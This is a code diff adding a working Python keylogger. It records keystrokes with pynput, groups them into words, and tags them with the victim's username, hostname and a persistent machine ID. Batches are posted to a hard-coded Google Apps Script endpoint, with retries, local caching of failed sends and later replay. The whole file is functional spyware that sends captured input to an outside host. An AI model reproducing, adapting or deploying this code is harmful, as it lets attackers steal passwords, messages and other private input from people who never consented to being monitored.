@@ -1,0 +1,214 @@
+from pynput.keyboard import Key, Listener
+import logging
+import requests
+import os
+import threading
+import queue
+import socket
+import getpass
+import time
+import uuid
+import json
+
+
+WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwX4TiQzAtQQuuNVa-z8p2jh2w-uBnSqgxyLLPvE1K8Crhv0skL4Zy1HYJjo5Tq6Fc3/exec" #badzz
+
+
+# Setup paths
+log_dir = r"C:\LOGS"
+os.makedirs(log_dir, exist_ok=True)
+uuid_file = os.path.join(log_dir, "machine_uuid.txt")
+
+
+# Setup logging
+logging.basicConfig(
+    filename=os.path.join(log_dir, "log.txt"),
+    level=logging.DEBUG,
+    format="%(asctime)s - %(levelname)s - %(message)s"
+)
+
+
+# Unique machine ID
+try:
+    if os.path.exists(uuid_file):
+        with open(uuid_file, "r") as f:
+            machine_uuid = f.read().strip()
+    else:
+        machine_uuid = str(uuid.uuid4())
+        with open(uuid_file, "w") as f:
+            f.write(machine_uuid)
+except Exception as e:
+    logging.error(f"Error while handling machine UUID file: {e}")
+    machine_uuid = "UNKNOWN"
+
+
+word_buffer = []
+buffer_lock = threading.Lock()  # Thread safety on word_buffer
+send_queue = queue.Queue(maxsize=100)
+user, hostname = getpass.getuser(), socket.gethostname()
+MASK_USER_INFO = False
+BATCH_SEND_INTERVAL = 5  # seconds
+MAX_BATCH_SIZE = 20
+INACTIVITY_TIMEOUT = 2  # seconds
+MIN_BUFFER_LENGTH = 3   # minimum characters to flush
+
+
+last_keypress_time = time.time()  # track last key press time
+
+
+def send_with_retries(data, retries=3, backoff=2):
+    headers = {'Content-Type': 'application/json', 'User-Agent': 'Keylogger/1.0'}
+    for attempt in range(1, retries + 1):
+        try:
+            resp = requests.post(WEB_APP_URL, json=data, headers=headers, timeout=10)
+            if resp.status_code == 200:
+                logging.info(f"Sent {len(data['words'])} items successfully")
+                return True
+            else:
+                logging.warning(f"Unexpected response code: {resp.status_code}")
+        except requests.exceptions.RequestException as e:
+            logging.warning(f"Send attempt {attempt} failed: {e}")
+        time.sleep(backoff ** attempt)
+    # Save if all attempts fail
+    try:
+        with open("unsent.json", "a", encoding="utf-8") as f:
+            f.write(json.dumps(data) + "\n")
+        logging.error(f"Failed to send batch of {len(data['words'])}, saved locally")
+    except Exception as e:
+        logging.error(f"Error writing unsent data to file: {e}")
+    return False
+
+
+def sender():
+    batch = []
+    last_send = time.time()
+    while True:
+        try:
+            item = send_queue.get(timeout=1)
+            batch.append(item)
+        except queue.Empty:
+            pass
+
+        # Replay offline data every 30 seconds
+        if time.time() - last_send >= 30:
+            replay_unsent()
+
+        if (len(batch) >= MAX_BATCH_SIZE) or (batch and (time.time() - last_send) >= BATCH_SEND_INTERVAL):
+            data = {
+                "words": batch,
+                "user": user if not MASK_USER_INFO else "MASKED",
+                "host": hostname if not MASK_USER_INFO else "MASKED",
+                "machine_uuid": machine_uuid,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+            }
+            send_with_retries(data)
+            batch = []
+            last_send = time.time()
+
+
+def flush_stored_batches():
+    if send_queue.empty():
+        return
+    with send_queue.mutex:
+        batch = list(send_queue.queue)
+        send_queue.queue.clear()
+    data = {
+        "words": batch,
+        "user": user if not MASK_USER_INFO else "MASKED",
+        "host": hostname if not MASK_USER_INFO else "MASKED",
+        "machine_uuid": machine_uuid,
+        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    send_with_retries(data)
+
+
+def on_press(key):
+    global last_keypress_time
+    ts = time.strftime("%Y-%m-%d %H:%M:%S")
+    NUMPAD_VK_BASE = 96  # VK code for numpad 0
+    last_keypress_time = time.time()  # update last key press time
+
+    try:
+        if hasattr(key, 'vk') and key.vk is not None:
+            vk = key.vk
+            if NUMPAD_VK_BASE <= vk <= NUMPAD_VK_BASE + 9:
+                numpad_num = vk - NUMPAD_VK_BASE
+                send_queue.put_nowait({"word": f"NUMPAD_{numpad_num}", "timestamp": ts})
+                return
+
+        if key == Key.enter:
+            with buffer_lock:
+                if word_buffer:
+                    send_queue.put_nowait({"word": ''.join(word_buffer), "timestamp": ts})
+                    word_buffer.clear()
+            send_queue.put_nowait({"word": "[ENTER]", "timestamp": ts})
+            return
+
+        if key == Key.backspace:
+            with buffer_lock:
+                if word_buffer:
+                    word_buffer.pop()
+            send_queue.put_nowait({"word": "[BACKSPACE]", "timestamp": ts})
+            return
+
+        if hasattr(key, 'char') and key.char:
+            with buffer_lock:
+                word_buffer.append(key.char)
+            return
+
+        # Ignore other keys
+        return
+    except queue.Full:
+        logging.warning("Queue full, dropping key")
+    except Exception as e:
+        logging.error(f"Error processing key press: {e}")
+
+
+def periodic_flush():
+    """Flush the word buffer after inactivity timeout and minimum length."""
+    while True:
+        time.sleep(1)
+        with buffer_lock:
+            if word_buffer:
+                if (time.time() - last_keypress_time) > INACTIVITY_TIMEOUT and len(word_buffer) >= MIN_BUFFER_LENGTH:
+                    ts = time.strftime("%Y-%m-%d %H:%M:%S")
+                    send_queue.put_nowait({"word": ''.join(word_buffer), "timestamp": ts})
+                    word_buffer.clear()
+
+
+def replay_unsent():
+    """Send stored offline data when connection is back."""
+    if not os.path.exists("unsent.json"):
+        return
+
+    lines_to_keep = []
+    try:
+        with open("unsent.json", "r", encoding="utf-8") as f:
+            for line in f:
+                try:
+                    data = json.loads(line.strip())
+                    if not send_with_retries(data):
+                        lines_to_keep.append(line)  # keep failed lines
+                except Exception as e:
+                    logging.warning(f"Skipping bad line in unsent.json: {e}")
+                    continue
+    except Exception as e:
+        logging.error(f"Error reading unsent.json for replay: {e}")
+        return
+
+    try:
+        with open("unsent.json", "w", encoding="utf-8") as f:
+            f.writelines(lines_to_keep)
+    except Exception as e:
+        logging.error(f"Error writing unsent.json after replay: {e}")
+
+
+if __name__ == "__main__":
+    # Start sender thread (daemon)
+    threading.Thread(target=sender, daemon=True).start()
+    # Start periodic flush thread (daemon)
+    threading.Thread(target=periodic_flush, daemon=True).start()
+
+    # Start keyboard listener
+    with Listener(on_press=on_press) as listener:
+        listener.join()
